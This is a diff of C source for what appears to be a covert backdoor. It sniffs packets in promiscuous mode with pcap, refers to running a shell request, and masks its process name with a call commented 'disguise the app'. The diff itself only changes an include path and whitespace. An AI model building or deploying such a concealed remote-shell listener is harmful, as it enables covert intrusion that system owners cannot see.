@@ -44,11 +44,7 @@
 	--		but an internal command could be added in place of the shell request
 	--
 	-------------------------------------------------------------------------------------------------*/
-
-#include <pcap.h>
-	#include <stdlib.h>
-	#include <netinet/ip.h>
-	#include "libs/pkt_sniffer.h"
+	#include "../shared/pkt_sniffer.h"
 
 // Function Prototypes
 // void pkt_callback (u_char*, const struct pcap_pkthdr*, const u_char*);
@@ -75,7 +71,7 @@ int main (int argc,char **argv){
     // Use pcap to get the IP address and subnet mask of the device
 	pcap_lookupnet (nic_dev, &netp, &maskp, errbuf);
 	if (nic_dev == NULL){printf("%s\n",errbuf);exit(1);}
-  	
+
 	// open the device for packet capture & set the device in promiscuous mode
 	nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
 	if (nic_descr == NULL){printf("pcap_open_live(): %s\n",errbuf); exit(1); }
@@ -86,7 +82,7 @@ int main (int argc,char **argv){
 
 	// Load the filter into the capture device
 	if (pcap_setfilter (nic_descr, &fp) == -1){ fprintf(stderr,"Error setting filter\n"); exit(1); }
-    
+
 	psmask(argv[0]); // disguise the app
 
     // Start the capture session
